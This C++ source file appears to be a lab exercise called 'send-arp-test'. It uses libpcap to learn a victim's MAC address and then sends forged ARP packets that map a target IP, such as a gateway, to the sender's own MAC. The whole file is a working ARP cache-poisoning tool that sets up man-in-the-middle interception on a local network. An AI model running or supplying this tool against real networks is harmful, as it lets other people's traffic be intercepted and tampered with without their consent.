#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <ifaddrs.h>
#include <stdlib.h>
#include <string.h>
#include <net/if.h>
#include <unistd.h>
#include "arphdr.h"
#include "ethhdr.h"
#include <stdio.h>
#include <cstdio>
#include <pcap.h>
#include <cstdio>
#include <pcap.h>

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax : ./send-arp-test <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample : ./send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
}

void getMacAddress(char* buf, char* dev) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr;
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);
    ioctl(fd, SIOCGIFHWADDR, &ifr);
    close(fd);
    unsigned char* mac = (unsigned char*)ifr.ifr_hwaddr.sa_data;
    snprintf(buf, 18, "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

void getIpAddress(char* buf, size_t buf_size, char* dev) {
	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	struct ifreq ifr;
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);
	ioctl(fd, SIOCGIFADDR, &ifr);
	close(fd);
	memcpy(buf, inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr), 16);
}

void initArpRequest(EthArpPacket& packet, char* myMac, char* myIp, char* targetIp) {
    packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
    packet.eth_.smac_ = Mac(myMac);
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(myMac);
    packet.arp_.sip_ = htonl(Ip(myIp));
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(Ip(targetIp));
}

void sendAndReceiveArp(pcap_t* handle, EthArpPacket& packet, Mac& senderMac) {
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* pack;
        int res = pcap_next_ex(handle, &header, &pack);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        struct EthArpPacket *ARPP = (struct EthArpPacket *)pack;
        if(ntohs(ARPP->eth_.type_) == 0x0806) {
            senderMac = ARPP->arp_.smac_;
            break;
        }
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    char myMac[18], myIp[16];
    getMacAddress(myMac, dev);
    getIpAddress(myIp, 16, dev);

    for (int i = 2; i < argc-1; i += 2) {
        EthArpPacket requestPacket, responsePacket;
        Mac senderMac;

        initArpRequest(requestPacket, myMac, myIp, argv[i]);
        sendAndReceiveArp(handle, requestPacket, senderMac);

        initArpRequest(responsePacket, myMac, argv[i+1], argv[i]);
        responsePacket.arp_.tmac_ = senderMac;
        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&responsePacket), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
    }

    pcap_close(handle);
    return 0;
}
